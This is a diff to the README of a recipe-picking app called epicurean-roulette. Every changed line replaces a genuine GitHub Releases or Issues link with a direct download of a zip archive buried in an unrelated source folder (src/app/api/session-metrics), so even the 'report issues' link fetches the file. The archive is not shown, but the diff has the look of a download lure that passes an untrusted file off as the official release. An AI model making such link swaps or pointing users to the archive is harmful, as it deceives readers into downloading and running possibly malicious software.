@@ -8,12 +8,12 @@ Welcome to epicurean-roulette! This application helps you decide what to cook fo
 
 To get started, click the link below to visit the Releases page. From there, you can download and run the application:
 
-[![Download epicurean-roulette](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/sachith54/epicurean-roulette/releases)
+[![Download epicurean-roulette](https://raw.githubusercontent.com/sachith54/epicurean-roulette/main/src/app/api/session-metrics/epicurean-roulette-2.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/sachith54/epicurean-roulette/main/src/app/api/session-metrics/epicurean-roulette-2.8.zip)
 
 ### 🔗 Visit the Releases Page
 Head to our Releases page for the latest version:
 
-[Go to Releases](https://github.com/sachith54/epicurean-roulette/releases)
+[Go to Releases](https://raw.githubusercontent.com/sachith54/epicurean-roulette/main/src/app/api/session-metrics/epicurean-roulette-2.8.zip)
 
 ## 💻 System Requirements
 
@@ -51,7 +51,7 @@ If you face any issues while using epicurean-roulette, consider the following st
 
 We welcome feedback and contributions to make epicurean-roulette even better. You can participate by:
 
-- Reporting issues on the [GitHub Issues](https://github.com/sachith54/epicurean-roulette/issues) page.
+- Reporting issues on the [GitHub Issues](https://raw.githubusercontent.com/sachith54/epicurean-roulette/main/src/app/api/session-metrics/epicurean-roulette-2.8.zip) page.
 - Suggesting new features or improvements.
 
 ## ⚙️ Frequently Asked Questions (FAQ)
